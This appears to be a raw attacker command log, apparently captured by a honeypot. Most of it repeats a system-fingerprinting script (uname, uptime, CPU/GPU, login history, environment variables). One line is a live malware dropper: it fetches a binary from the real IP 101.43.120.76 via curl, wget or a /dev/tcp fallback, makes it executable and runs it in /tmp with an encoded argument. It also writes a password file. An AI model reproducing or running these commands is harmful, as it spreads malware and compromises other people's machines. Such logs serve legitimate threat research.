"CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
mount | head -5
ls -la /
env | head -10
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
echo 1 > /dev/null && cat /bin/echo
nohup $SHELL -c "curl http://101.43.120.76:60120/linux -o /tmp/N5RTn5b5TL; if [ ! -f /tmp/N5RTn5b5TL ]; then wget http://101.43.120.76:60120/linux -O /tmp/N5RTn5b5TL; fi; if [ ! -f /tmp/N5RTn5b5TL ]; then exec 6<>/dev/tcp/101.43.120.76/60120 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/N5RTn5b5TL ; chmod +x /tmp/N5RTn5b5TL && /tmp/N5RTn5b5TL q3+FT/nC7ZAOv7/YOTo/MsC7uQ6P/8T8T49q0shuj1flyeaECbi6xjgvPj3CpbEOkOfD5VmHadbXa4hB+sfukAyxpcUwITYwzL24Do7q0PpQhHHX32aTUv7e7Y4Lsr3GOT0/KMK8pg2N5t75VI5x3tFli1H6w+eeC7+lzzshPjrGpbsGhOnA+lWPf97IbYxW5cLukA6/vsw+Pz44z6u8CJDnw+VTjWzI12eOW/3A7o0HqLrHMSE+Mc+luwqQ7cD4W4tv19RvnVf73u6JD6a5wzshOD/MvbgOjO/Q80+MatPIbotP+cLvhAm4usQ+Lzs72Lq7BpDuxfNPjGzS3GmNUPjH/48KvKXPOSE3O9i6uQWI78H4VJ1nyNRujU/6wu2QDrq+zD4/PjzPq7kPj/HE+E+MbdbIaItb/cDujA+ov8EmNzkmxLKmDo/myv1RjGvTxm6NUOXC744RurnOJj08PMy9uA6O5tD6UYpx19Frk1P7xfGPC7qxwDg+Pz/Ws6YOjObe+lGMcdTWZYtR+sLung66uNg9OCE5wL2mDonryv1RjG7exmeIT/nB65ALu6XHOzk1Psa6uA2e68flWYtx19Fpk1P7yeWID7m4xSg+PjvYuboJkObI5VCMadzQb4xQ/tDujwamus8xITw92Lm4C4TpwPpTjX/X1WuTUPnC8YkMprjGMjk/Oca9qAuJ8cj9T49myNduhFv9wO6KCqiz2Dk7PybEuLwRj+zG8VeNbtbTf4lW5cnskA66u9g7NjU+xrq8DZ7rx+VQj2/I02qTUvLK6Y4OvLlW5qRZBKwlHMg67ulPIC9HH2Wy96L6XM84GbmwPSE=; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/N5RTn5b5TL && /tmp/N5RTn5b5TL q3+FT/nC7ZAOv7/YOTo/MsC7uQ6P/8T8T49q0shuj1flyeaECbi6xjgvPj3CpbEOkOfD5VmHadbXa4hB+sfukAyxpcUwITYwzL24Do7q0PpQhHHX32aTUv7e7Y4Lsr3GOT0/KMK8pg2N5t75VI5x3tFli1H6w+eeC7+lzzshPjrGpbsGhOnA+lWPf97IbYxW5cLukA6/vsw+Pz44z6u8CJDnw+VTjWzI12eOW/3A7o0HqLrHMSE+Mc+luwqQ7cD4W4tv19RvnVf73u6JD6a5wzshOD/MvbgOjO/Q80+MatPIbotP+cLvhAm4usQ+Lzs72Lq7BpDuxfNPjGzS3GmNUPjH/48KvKXPOSE3O9i6uQWI78H4VJ1nyNRujU/6wu2QDrq+zD4/PjzPq7kPj/HE+E+MbdbIaItb/cDujA+ov8EmNzkmxLKmDo/myv1RjGvTxm6NUOXC744RurnOJj08PMy9uA6O5tD6UYpx19Frk1P7xfGPC7qxwDg+Pz/Ws6YOjObe+lGMcdTWZYtR+sLung66uNg9OCE5wL2mDonryv1RjG7exmeIT/nB65ALu6XHOzk1Psa6uA2e68flWYtx19Fpk1P7yeWID7m4xSg+PjvYuboJkObI5VCMadzQb4xQ/tDujwamus8xITw92Lm4C4TpwPpTjX/X1WuTUPnC8YkMprjGMjk/Oca9qAuJ8cj9T49myNduhFv9wO6KCqiz2Dk7PybEuLwRj+zG8VeNbtbTf4lW5cnskA66u9g7NjU+xrq8DZ7rx+VQj2/I02qTUvLK6Y4OvLlW5qRZBKwlHMg67ulPIC9HH2Wy96L6XM84GbmwPSE=" &
head -c 8308096 > /tmp/69T30X2782
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
